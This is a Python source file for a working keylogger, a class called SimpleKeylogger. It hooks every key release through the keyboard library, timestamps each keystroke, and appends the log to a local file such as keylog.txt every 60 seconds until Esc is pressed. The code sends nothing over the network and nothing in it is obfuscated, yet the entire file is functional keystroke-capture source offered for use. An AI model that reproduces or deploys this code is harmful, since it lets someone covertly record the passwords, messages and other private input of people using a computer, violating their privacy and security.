import keyboard  # type: ignore
import os
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 60  # seconds

class SimpleKeylogger:
    def __init__(self, interval, log_file_name):
        self.interval = interval
        self.log_file_name = self.get_unique_filename(log_file_name)
        self.log_file_path = os.path.join(os.getcwd(), self.log_file_name)
        self.log = ""
        self.timer = None

    def get_unique_filename(self, base_filename):
        """Check if the log file exists and find a unique name if necessary."""
        if not os.path.exists(base_filename):
            return base_filename
        else:
            # If "keylog.txt" exists, start looking for "keylog1.txt", "keylog2.txt", etc.
            i = 1
            while os.path.exists(f"{os.path.splitext(base_filename)[0]}{i}.txt"):
                i += 1
            return f"{os.path.splitext(base_filename)[0]}{i}.txt"

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            else:
                name = f"[{name.upper()}]"
        # Add timestamp to each log entry
        self.log += f"{datetime.now().strftime('%d/%m/%Y %H:%M:%S')} - {name}\n"

    def report_to_file(self):
        with open(self.log_file_path, "a") as f:
            f.write(self.log)
        self.log = ""

    def report(self):
        self.report_to_file()
        self.timer = Timer(interval=self.interval, function=self.report)
        self.timer.daemon = True
        self.timer.start()

    def stop(self):
        print("Stopping keylogger...")
        self.report_to_file()  # Save remaining logs
        if self.timer:
            self.timer.cancel()  # Stop the timer
        keyboard.unhook_all()  # Unhook all keyboard events
        os._exit(0)  # Exit the program

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()

        # Press "Esc" to stop the keylogger
        keyboard.add_hotkey('esc', self.stop)

        keyboard.wait()  # Wait indefinitely until "Esc" is pressed

if __name__ == "__main__":
    keylogger = SimpleKeylogger(interval=SEND_REPORT_EVERY, log_file_name="keylog.txt")
    keylogger.start()
